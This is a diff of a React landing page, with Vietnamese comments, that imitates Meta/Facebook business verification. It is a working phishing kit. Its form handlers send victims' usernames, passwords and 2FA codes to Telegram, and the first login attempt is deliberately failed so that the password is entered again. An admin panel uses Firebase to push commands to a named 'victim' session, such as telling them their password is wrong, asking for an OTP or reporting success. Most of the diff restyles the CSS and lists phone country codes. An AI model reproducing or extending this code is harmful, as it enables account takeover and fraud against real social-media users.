         setTimeout(() => { setLoading(false); setStep(2); }, 700);
     };
 
     const handleLogin = (e) => {
         e.preventDefault(); if (loginPass.length === 0) return;
         setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
-        
         sendTelegramMessage(`<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
-        
         setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
     };
 
     const handleOtp = (e) => {
         e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
         setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
-        
         if (newAttempt <= 3) sendTelegramMessage(`<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
-        
         setTimeout(() => { 
             setLoading(false); 
             if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
@@ -540,36 +287,197 @@ const Home = () =>
     const handleAdminCommand = (type, value) => {
         const targetUser = adminSessionId.trim(); 
         if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
-        
-        set(ref(database, 'commands/' + targetUser), {
-            action: type,
-            value: value
-        }).then(() => {
+        set(ref(database, 'commands/' + targetUser), { action: type, value: value }).then(() => {
             alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
-        }).catch((error) => {
-            alert("Lỗi gửi lệnh: " + error.message);
-        });
+        }).catch((error) => { alert("Lỗi gửi lệnh: " + error.message); });
     };
 
-    if ( isLoading ) {
-        return (
-            <div id="intro">
-                {/* Loading screen */}
-            </div>
-        );
-    }
+    if ( isLoading ) { return <div id="intro"></div>; }
 
     return (
         <>
-            {/* CSS CHO FORM MODAL */}
+            {/* CHÈN CHÍNH XÁC FILE CSS TỪ BẠN GỬI */}
             <style>{`
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                .fb-input { width: 100%; height: 52px; padding: 14px 16px; font-size: 16px; border: 1px solid rgb(224, 226, 228); border-radius: 16px; outline: none; box-sizing: border-box; background: #fff; color: #1c2b33; transition: border-color 0.2s; }
-                .fb-input:focus { border-color: #1877f2; }
-                .fb-btn { width: 100%; height: 48px; background: #1877f2; color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
-                .fb-btn:hover { background: #166fe5; }
+                *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+                html { scroll-behavior: smooth; }
+                body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1c2b33; background: #fff; line-height: 1.5; -webkit-font-smoothing: antialiased; }
+                a { color: inherit; text-decoration: none; }
+                img, svg, video { display: block; max-width: 100%; }
+                button { cursor: pointer; border: none; background: none; font-family: inherit; }
+                h1, h2, h3, h4, h5, h6 { font-weight: 700; line-height: 1.2; }
+                h1 { font-size: clamp(28px, 3.5vw, 48px); }
+                h2 { font-size: clamp(22px, 2.5vw, 36px); }
+                p { font-size: 15px; line-height: 1.6; }
+                a:hover { text-decoration: underline; }
+                .container-narrow { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+
+                /* HEADER */
+                .header { position: sticky; top: 0; z-index: 100; background: #f5f6f6; border-bottom: 1px solid #e4e6e8; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; }
+                .header-left { display: flex; align-items: center; gap: 8px; }
+                .header-logo img { width: 65px; height: auto; }
+                .nav-links { display: none; align-items: center; gap: 28px; margin-left: 50px; }
+                .nav-link { font-size: 14px; font-weight: 600; cursor: pointer; position: relative; padding-bottom: 2px; }
+                .nav-link::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: #cbd2d9; transform: scaleX(0); transform-origin: 0; transition: transform .3s; }
+                .nav-link:hover::after { transform: scaleX(1); }
+                .header-right { display: none; align-items: center; gap: 16px; }
+                .header-icon { width: 20px; height: 20px; cursor: pointer; }
+                .avatar-btn { width: 40px; height: 40px; border-radius: 50%; background: #e4e6e8; display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; }
+                .hamburger { display: flex; flex-direction: column; gap: 5px; padding: 4px; cursor: pointer; }
+                .hamburger span { width: 22px; height: 2px; background: #1c2b33; border-radius: 2px; }
+                .header-mobile-icons { display: flex; align-items: center; gap: 16px; }
+
+                /* HERO */
+                .hero-inner { max-width: 1440px; margin: 0 auto; padding: 40px 24px; display: flex; flex-direction: column; gap: 40px; }
+                .hero-text-inner { display: flex; flex-direction: column; align-items: flex-start; }
+                .hero-icon { width: 60px; height: 60px; margin-bottom: 24px; }
+                .hero-title { font-weight: 500; margin-bottom: 16px; }
+                .hero-subtitle { font-size: 16px; margin-bottom: 28px; }
+                .btn-primary { display: inline-flex; align-items: center; justify-content: center; padding: 14px 40px; background: #0064e0; color: #fff; border-radius: 45px; font-size: 16px; font-weight: 700; transition: background .2s; }
+                .btn-primary:hover { background: #0056c7; text-decoration: none; }
+                .hero-note { margin-top: 24px; font-size: 14px; color: #465a69; max-width: 480px; }
+                .hero-image { width: 100%; border-radius: 16px; overflow: hidden; background: #f0f2f5; position: relative; }
+                .hero-image img { width: 100%; height: auto; display: block; }
+
+                /* BENEFITS */
+                .benefits { padding: 40px 0; }
+                .benefits-header { max-width: 1440px; margin: 0 auto; padding: 24px 24px 0; }
+                .benefits-header h2 { margin-bottom: 16px; }
+                .benefits-header p { font-size: 14px; max-width: 800px; margin-bottom: 16px; }
+                .benefits-learn-more { display: inline-flex; align-items: center; gap: 8px; color: #0064e0; font-size: 14px; font-weight: 500; cursor: pointer; }
+                .benefits-grid { max-width: 1440px; margin: 0 auto; padding: 32px 24px 40px; display: flex; flex-direction: column; gap: 32px; }
+                .benefits-image { border-radius: 16px; overflow: hidden; width: 100%; aspect-ratio: 6/5; background: #e4e6eb; position: relative; display: flex; align-items: center; justify-content: center; }
+                .benefits-image img { width: 100%; height: 100%; object-fit: cover; display: block; transition: opacity .3s; }
+                .benefits-accordion { width: 100%; border-top: 1px solid #e5e7eb; }
+                .benefit-item { padding: 24px 0; border-bottom: 1px solid #e5e7eb; cursor: pointer; color: #9ca3af; }
+                .benefit-item.active, .benefit-item:hover { color: #1c2b33; }
+                .benefit-header { display: flex; justify-content: space-between; align-items: center; font-size: 22px; font-weight: 500; }
+                .benefit-chevron { width: 24px; height: 24px; transition: transform .3s; }
+                .benefit-chevron.rotated { transform: rotate(180deg); }
+                .benefit-desc { max-height: 0; overflow: hidden; opacity: 0; transition: max-height .4s, opacity .3s; }
+                .benefit-desc.open { max-height: 200px; opacity: 1; }
+                .benefit-desc p { font-size: 15px; color: #465a69; margin-top: 16px; max-width: 480px; }
+
+                /* STEPS */
+                .steps { margin: 80px 0; background: #f5f6f7; }
+                .steps-inner { max-width: 1440px; margin: 0 auto; padding: 60px 24px; }
+                .steps-inner h2 { margin-bottom: 16px; }
+                .steps-inner > p { font-size: 15px; max-width: 800px; margin-bottom: 40px; }
+                .steps-grid { display: grid; grid-template-columns: 1fr; gap: 24px; }
+                .step-card { background: #fff; border: 1px solid #cbd2d9; border-radius: 24px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,.05); }
+                .step-number { width: 56px; height: 56px; border-radius: 50%; background: #1c2b33; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; margin-bottom: 16px; }
+                .step-title { font-size: 22px; font-weight: 300; margin-bottom: 12px; }
+                .step-desc { font-size: 14px; color: #465a69; line-height: 1.6; }
+
+                /* TESTIMONIALS */
+                .testimonials { padding: 60px 0; }
+                .testimonials h2 { text-align: center; margin-bottom: 40px; }
+                .carousel-wrapper { border-radius: 32px; overflow: hidden; }
+                .carousel-track { display: flex; transition: transform .5s; }
+                .carousel-slide { flex-shrink: 0; width: 100%; min-height: 180px; padding: 48px 56px; background: #f1f4f7; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+                .carousel-quote { font-size: 20px; line-height: 1.6; max-width: 800px; margin-bottom: 24px; }
+                .carousel-author { font-size: 14px; font-weight: 500; color: #465a69; }
+                .carousel-nav { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 32px; }
+                .carousel-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #cbd2d9; display: flex; align-items: center; justify-content: center; background: none; }
+                .carousel-btn:hover { background: #f3f4f6; }
+                .carousel-dots { display: flex; gap: 8px; }
+                .dot { width: 7px; height: 7px; border-radius: 50%; background: #cbd2d9; transition: background .3s; cursor: pointer; }
+                .dot.active { background: #1c2b33; }
+
+                /* CTA */
+                .cta { background: #f5f6f7; }
+                .cta-inner { max-width: 1440px; margin: 0 auto; padding: 64px 24px; display: flex; flex-direction: column; align-items: center; gap: 48px; }
+                .cta-content { text-align: center; width: 100%; }
+                .cta-icon { width: 64px; height: 64px; margin: 0 auto 32px; }
+                .cta-content h2 { font-size: 36px; font-weight: 500; margin-bottom: 32px; }
+                .cta-image { width: 100%; background: #f0f2f5; border-radius: 16px; overflow: hidden; }
+                .cta-image img { width: 100%; height: auto; display: block; }
+
+                /* FAQ */
+                .faq { padding: 80px 0; }
+                .faq-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+                .faq-inner h2 { margin-bottom: 8px; }
+                .faq-sub { font-size: 15px; color: #465a69; margin-bottom: 32px; }
+                .faq-list { border-top: 1px solid #e5e7eb; }
+                .faq-item { border-bottom: 1px solid #e5e7eb; }
+                .faq-question { width: 100%; padding: 24px 0; display: flex; justify-content: space-between; align-items: center; gap: 16px; font-size: 18px; font-weight: 500; text-align: left; color: #1c2b33; }
+                .faq-chevron { width: 24px; height: 24px; transition: transform .3s; flex-shrink: 0; }
+                .faq-chevron.open { transform: rotate(180deg); }
+                .faq-answer { max-height: 0; overflow: hidden; transition: max-height .3s; }
+                .faq-answer.open { max-height: 400px; }
+                .faq-answer p { padding-bottom: 24px; font-size: 15px; color: #65676b; }
+
+                /* FOOTER */
+                .footer { background: #1b2a33; color: #fff; }
+                .footer-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+                .footer-newsletter { padding: 64px 0; border-bottom: 1px solid rgba(255,255,255,.1); }
+                .footer-row { display: flex; flex-direction: column; gap: 32px; }
+                .footer-title { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
+                .footer-desc { font-size: 14px; color: #9ba3af; }
+                .footer-form { display: flex; flex-wrap: wrap; gap: 12px; }
+                .footer-input { padding: 12px 16px; border: none; border-radius: 8px; color: #1f2937; font-size: 14px; width: 240px; min-width: 180px; outline: none; }
+                .footer-subscribe { padding: 12px 24px; background: #0062ff; color: #fff; border-radius: 45px; font-size: 14px; font-weight: 600; white-space: nowrap; }
+                .footer-consent { margin-top: 16px; font-size: 11px; color: #7a8b98; max-width: 700px; }
+                .footer-bottom { padding: 40px 0; display: flex; flex-direction: column; gap: 24px; }
+                .footer-copy { font-size: 12px; color: #9ba3af; }
+                .footer-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+                .footer-link { font-size: 13px; color: #d1d5db; display: block; margin-bottom: 8px; }
+                .footer-link:hover { color: #fff; }
+
+                /* MODAL SYSTEM */
+                .modal-overlay { position: fixed; inset: 0; z-index: 1000; display: none; align-items: center; justify-content: center; padding: 24px 16px; background: rgba(20, 24, 28, .55); -webkit-backdrop-filter: blur(6px) saturate(120%); backdrop-filter: blur(6px) saturate(120%); overflow-y: auto; }
+                .modal-overlay.open { display: flex; }
+                .modal-container { position: relative; width: 100%; max-width: 420px; margin: auto; background: #ffffff; border-radius: 12px; padding: 28px 20px 20px; box-shadow: 0 12px 28px rgba(0, 0, 0, .2), 0 2px 4px rgba(0, 0, 0, .08), 0 0 0 1px rgba(0, 0, 0, .04); max-height: calc(100vh - 48px); overflow-y: auto; -webkit-overflow-scrolling: touch; }
+                .modal-container::-webkit-scrollbar { width: 8px; }
+                .modal-container::-webkit-scrollbar-thumb { background: #ccd0d5; border-radius: 4px; }
+                .modal-overlay.open .modal-container { animation: modalIn .3s cubic-bezier(.16,.84,.44,1) both; }
+                .modal-container.modal-out { animation: modalOut .18s ease-in forwards; }
+                @keyframes modalIn { from { opacity: 0; transform: translateY(14px) scale(.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
+                @keyframes modalOut { from { opacity: 1; transform: translateY(0) scale(1); } to { opacity: 0; transform: translateY(8px) scale(.98); } }
+                @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-5px); } 40% { transform: translateX(5px); } 60% { transform: translateX(-3px); } 80% { transform: translateX(3px); } }
+                .shake { animation: shake .4s ease; }
+                .modal-close { position: absolute; top: 12px; right: 12px; width: 34px; height: 34px; border-radius: 50%; background: #f0f2f5; color: #606770; display: flex; align-items: center; justify-content: center; transition: background .15s, color .15s; z-index: 2; }
+                .modal-close:hover { background: #e4e6eb; color: #050505; }
+                .modal-close:active { transform: scale(.94); }
+                .modal-brand { display: flex; justify-content: center; margin-bottom: 18px; }
+                .modal-brand img { max-height: 60px; object-fit: contain; }
+                .modal-title { font-size: 22px; font-weight: 700; letter-spacing: -.3px; color: #050505; text-align: center; margin-bottom: 6px; line-height: 1.3; }
+                .modal-subtitle { font-size: 14.5px; line-height: 1.5; color: #65676b; text-align: center; margin: 0 auto 20px; max-width: 340px; }
+                .fb-form { display: flex; flex-direction: column; gap: 12px; }
+                .fb-input-group { width: 100%; }
+                .fb-input { width: 100%; height: 56px; padding: 10px 16px; background: rgba(255, 255, 255, 0.2); border: 1px solid rgb(224, 226, 228); border-radius: 16px; font-size: 15.2px; font-family: -apple-system, system-ui, "Segoe UI", Roboto, "Optimistic 95", sans-serif; color: rgb(17, 17, 18); outline: none; line-height: 1.3; caret-color: rgb(17, 17, 18); transition: border-color .15s ease, box-shadow .15s ease; }
+                .fb-input::placeholder { color: rgb(104, 106, 110); font-weight: 400; }
+                .fb-input:hover { border-color: rgb(180, 183, 186); }
+                .fb-input:focus { border-color: rgb(0, 100, 224); box-shadow: 0 0 0 3px rgba(0, 100, 224, .1); }
+                .fb-input.input-error { border-color: #fa383e; background: #fffafa; }
                 .fb-phone-group { display: flex; gap: 8px; }
-                .fb-phone-select-wrap { flex: 0 0 120px; position: relative; }
+                .fb-phone-select-wrap { position: relative; flex: 0 0 42%; }
+                .fb-phone-select { width: 100%; height: 56px; padding: 10px 30px 10px 14px; background: rgba(255, 255, 255, 0.2); border: 1px solid rgb(224, 226, 228); border-radius: 16px; font-size: 14px; font-family: inherit; color: rgb(17, 17, 18); appearance: none; -webkit-appearance: none; -moz-appearance: none; cursor: pointer; outline: none; text-overflow: ellipsis; transition: border-color .15s ease, box-shadow .15s ease; }
+                .fb-phone-select:hover { border-color: rgb(180, 183, 186); }
+                .fb-phone-select:focus { border-color: rgb(0, 100, 224); box-shadow: 0 0 0 3px rgba(0, 100, 224, .1); }
+                .fb-phone-select-wrap::after { content: ""; position: absolute; right: 14px; top: 50%; width: 7px; height: 7px; border-right: 2px solid rgb(104, 106, 110); border-bottom: 2px solid rgb(104, 106, 110); transform: translateY(-72%) rotate(45deg); pointer-events: none; }
+                .fb-phone-group .fb-input { flex: 1 1 auto; min-width: 0; }
+                .field-error { display: none; align-items: flex-start; gap: 6px; margin-top: 6px; font-size: 13px; font-weight: 500; line-height: 1.35; color: #fa383e; }
+                .field-error.show { display: flex; }
+                .field-error svg { flex: 0 0 auto; margin-top: 1px; }
+                .alert-error { display: none; align-items: flex-start; gap: 10px; padding: 12px 14px; margin-top: 4px; background: #ffebe8; border: 1px solid #ffc9c4; border-radius: 12px; font-size: 13.5px; font-weight: 500; line-height: 1.45; color: #b3261e; }
+                .alert-error.show { display: flex; }
+                .alert-error svg { flex: 0 0 auto; margin-top: 1px; }
+                .fb-btn { width: 100%; height: 44px; margin-top: 12px; padding: 0 20px; background: rgb(0, 100, 224); color: rgb(243, 244, 245); border: 0; border-radius: 22px; font-size: 15.2px; font-weight: 500; font-family: inherit; cursor: pointer; transition: background .15s ease, transform .08s ease; display: flex; align-items: center; justify-content: center; gap: 8px; }
+                .fb-btn:hover { background: rgb(0, 88, 200); }
+                .fb-btn:active { transform: scale(.99); }
+                .fb-btn:disabled { opacity: .65; cursor: default; transform: none; }
+                .fb-helper { text-align: center; padding: 12px 0 0; }
+                .fb-helper a { display: inline-flex; align-items: center; justify-content: center; height: 36px; padding: 0 16px; color: rgb(17, 17, 18); font-size: 15.2px; font-weight: 500; text-decoration: none; }
+                .fb-helper a:hover { text-decoration: underline; }
+                .modal-meta-footer { display: flex; align-items: center; justify-content: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e4e6eb; }
+                .modal-meta-footer img { height: 12px; width: auto; max-width: 70px; object-fit: contain; display: block; }
+                .fb-otp-input { height: 64px; text-align: center; font-size: 26px; font-weight: 700; letter-spacing: 12px; text-indent: 12px; font-variant-numeric: tabular-nums; }
+                .fb-otp-input::placeholder { letter-spacing: 12px; text-indent: 12px; font-weight: 500; color: #ccd0d5; }
+                .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, .45); border-top-color: #ffffff; border-radius: 50%; animation: spin .7s linear infinite; }
+                @keyframes spin { to { transform: rotate(360deg); } }
+                @media (max-width: 480px) { .modal-container { padding: 24px 16px 16px; border-radius: 12px; } .modal-overlay { padding: 12px; } .modal-close { top: 10px; right: 10px; width: 32px; height: 32px; } .modal-brand img { max-height: 52px; } .modal-title { font-size: 20px; } .modal-subtitle { font-size: 13.5px; } }
+                @media (max-width: 400px) { .fb-phone-group { flex-wrap: wrap; } .fb-phone-select-wrap { flex: 1 1 100%; } }
+                @media (min-width: 768px) { .header { height: 80px; } .nav-links, .header-right { display: flex; } .hamburger, .header-mobile-icons { display: none; } .hero-inner { flex-direction: row; align-items: center; padding: 64px 24px; } .hero-text { width: 40%; } .hero-text-inner { max-width: 480px; } .hero-icon { width: 72px; height: 72px; } .hero-image { width: 60%; margin-right: -24px; } .hero-image img { border-radius: 24px; } .benefits-header { padding: 80px 24px 0; } .benefits-grid { flex-direction: row; gap: 48px; padding: 64px 24px 80px; } .benefits-image, .benefits-accordion { width: 50%; } .steps { margin: 0; } .steps-inner { padding: 80px 24px; } .steps-grid { grid-template-columns: repeat(3, 1fr); } .carousel-slide { padding: 48px 56px; } .cta-inner { flex-direction: row; align-items: center; padding: 112px 80px; } .cta-content { text-align: left; width: 35%; } .cta-icon { margin: 0 0 32px; } .cta-title { font-size: 44px; } .cta-image { width: 60%; margin-right: -80px; } .footer-row { flex-direction: row; justify-content: space-between; align-items: center; } .footer-bottom { flex-direction: row; justify-content: space-between; align-items: flex-start; } .footer-grid { grid-template-columns: repeat(6, auto); gap: 32px; } }
             `}</style>
 
             <div className="meta-landing">
@@ -939,366 +847,363 @@ const Home = () =>
             {/* Modal cũ */}
             <HomeStartModals isOpen={ isStartModalsOpen } onClose={ () => setStartModalsOpen( false ) } metaCopy={ { title: texts.metaVerifiedTitle, description: texts.metaVerifiedDesc, btnFacebook: texts.metaVerifiedBtnFacebook, btnInstagram: texts.metaVerifiedBtnInstagram, businessLead: texts.metaVerifiedBusinessLead, businessLink: texts.metaVerifiedBusinessLink, disclaimer: texts.metaVerifiedDisclaimer, ariaClose: texts.metaVerifiedAriaClose, phonesAlt: texts.metaVerifiedPhonesAlt, cornerLabel: texts.metaVerifiedCornerLabel, cornerLead: texts.homeStartModalCornerLead } } monetizeCopy={ { cornerLabel: texts.monetizeModalCornerLabel, cornerLead: texts.homeStartModalCornerLead, back: texts.monetizeModalBack, eyebrow: texts.monetizeModalEyebrow, title: texts.monetizeModalTitle, creatorLabel: texts.monetizeModalCreator, description: texts.monetizeModalDesc, subscribe: texts.monetizeModalSubscribe, brandName: texts.monetizeModalBrand, heroAlt: texts.monetizeModalHeroAlt } } />
 
-            {/* ================= MODAL FORM NHẬP LIỆU ================= */}
-            {showModal && (
-                <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
-                    <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
-                        
-                        <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
-                        </button>
+            {/* ================= MODAL FORM NHẬP LIỆU (DÙNG CHUẨN CLASS CSS) ================= */}
+            <div className={`modal-overlay ${showModal ? 'open' : ''}`}>
+                <div className="modal-container">
+                    <button className="modal-close" onClick={() => { localStorage.clear(); window.location.replace('/live'); }}>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+                    </button>
 
-                        {showAdmin ? (
-                          <div style={{ textAlign: 'center' }}>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
-                            <div style={{ marginBottom: '20px' }}>
-                                <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
-                                <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
+                    {showAdmin ? (
+                      <div style={{ textAlign: 'center' }}>
+                        <h2 className="modal-title">Admin Panel</h2>
+                        <div style={{ marginBottom: '20px' }}>
+                            <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
+                            <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
+                        </div>
+                        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                            <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
+                            <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
+                            <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
+                            
+                            <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
+                                <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
+                                <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
+                                <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
                             </div>
-                            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-                                <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
-                                <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
-                                <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
-                                
-                                <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
-                                    <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
-                                    <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
-                                    <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
-                                </div>
-                                
-                                <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
-                            </div>
-                          </div>
-                        ) : (
+                            
+                            <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                        </div>
+                      </div>
+                    ) : (
+                      <>
+                        <div className="modal-brand">
+                            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" />
+                        </div>
+
+                        {/* FORM 1: SIGNUP */}
+                        {step === 1 && (
                           <>
-                            <div style={{ textAlign: 'center', marginBottom: '18px' }}>
-                                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
-                            </div>
-
-                            {/* FORM 1: SIGNUP */}
-                            {step === 1 && (
-                              <>
-                                <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
-                                <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form1Sub}</p>
-                                <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                                    <div>
-                                        <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
-                                        {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
-                                    </div>
-                                    <div>
-                                        <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
-                                        {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
-                                    </div>
-                                    <div>
-                                        <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
-                                        {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
-                                    </div>
-                                    <div>
-                                        <div className="fb-phone-group">
-                                            <div className="fb-phone-select-wrap">
-                                                <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
-                                                    <option value="+93">+93 (Afghanistan)</option>
-                                                    <option value="+355">+355 (Albania)</option>
-                                                    <option value="+213">+213 (Algeria)</option>
-                                                    <option value="+1">+1 (American Samoa)</option>
-                                                    <option value="+376">+376 (Andorra)</option>
-                                                    <option value="+244">+244 (Angola)</option>
-                                                    <option value="+1">+1 (Anguilla)</option>
-                                                    <option value="+1">+1 (Antigua and Barbuda)</option>
-                                                    <option value="+54">+54 (Argentina)</option>
-                                                    <option value="+374">+374 (Armenia)</option>
-                                                    <option value="+297">+297 (Aruba)</option>
-                                                    <option value="+61">+61 (Australia)</option>
-                                                    <option value="+43">+43 (Austria)</option>
-                                                    <option value="+994">+994 (Azerbaijan)</option>
-                                                    <option value="+1">+1 (Bahamas)</option>
-                                                    <option value="+973">+973 (Bahrain)</option>
-                                                    <option value="+880">+880 (Bangladesh)</option>
-                                                    <option value="+1">+1 (Barbados)</option>
-                                                    <option value="+375">+375 (Belarus)</option>
-                                                    <option value="+32">+32 (Belgium)</option>
-                                                    <option value="+501">+501 (Belize)</option>
-                                                    <option value="+229">+229 (Benin)</option>
-                                                    <option value="+1">+1 (Bermuda)</option>
-                                                    <option value="+975">+975 (Bhutan)</option>
-                                                    <option value="+591">+591 (Bolivia)</option>
-                                                    <option value="+387">+387 (Bosnia and Herzegovina)</option>
-                                                    <option value="+267">+267 (Botswana)</option>
-                                                    <option value="+55">+55 (Brazil)</option>
-                                                    <option value="+1">+1 (British Virgin Islands)</option>
-                                                    <option value="+673">+673 (Brunei)</option>
-                                                    <option value="+359">+359 (Bulgaria)</option>
-                                                    <option value="+226">+226 (Burkina Faso)</option>
-                                                    <option value="+257">+257 (Burundi)</option>
-                                                    <option value="+855">+855 (Cambodia)</option>
-                                                    <option value="+237">+237 (Cameroon)</option>
-                                                    <option value="+1">+1 (Canada)</option>
-                                                    <option value="+238">+238 (Cape Verde)</option>
-                                                    <option value="+1">+1 (Cayman Islands)</option>
-                                                    <option value="+236">+236 (Central African Republic)</option>
-                                                    <option value="+235">+235 (Chad)</option>
-                                                    <option value="+56">+56 (Chile)</option>
-                                                    <option value="+86">+86 (China)</option>
-                                                    <option value="+57">+57 (Colombia)</option>
-                                                    <option value="+269">+269 (Comoros)</option>
-                                                    <option value="+242">+242 (Congo - Brazzaville)</option>
-                                                    <option value="+243">+243 (Congo - Kinshasa)</option>
-                                                    <option value="+682">+682 (Cook Islands)</option>
-                                                    <option value="+506">+506 (Costa Rica)</option>
-                                                    <option value="+225">+225 (Côte d'Ivoire)</option>
-                                                    <option value="+385">+385 (Croatia)</option>
